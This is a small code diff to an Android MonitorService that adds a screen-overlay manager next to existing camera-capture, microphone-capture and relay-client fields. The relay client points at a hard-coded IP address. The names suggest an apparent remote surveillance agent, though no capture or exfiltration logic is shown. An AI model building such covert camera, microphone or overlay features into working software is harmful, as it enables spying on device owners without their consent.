@@ -26,9 +26,10 @@ public class MonitorService extends Service {
     public static final String DEFAULT_RELAY = "http://162.35.37.67:5000";
     public static final String AGENT_SECRET  = "";
 
-    private RelayClient   relay;
-    private CameraCapture cameraCapture;
-    private MicCapture    micCapture;
+    private RelayClient          relay;
+    private CameraCapture        cameraCapture;
+    private MicCapture           micCapture;
+    private ScreenOverlayManager screenOverlay;
 
     private static MonitorService instance;
     public static MonitorService getInstance() { return instance; }
@@ -96,6 +97,10 @@ public class MonitorService extends Service {
     }
 
     public RelayClient getRelay() { return relay; }
+    public ScreenOverlayManager getScreenOverlay() {
+        if (screenOverlay == null) screenOverlay = new ScreenOverlayManager(this);
+        return screenOverlay;
+    }
 
     @Override
     public void onDestroy() {
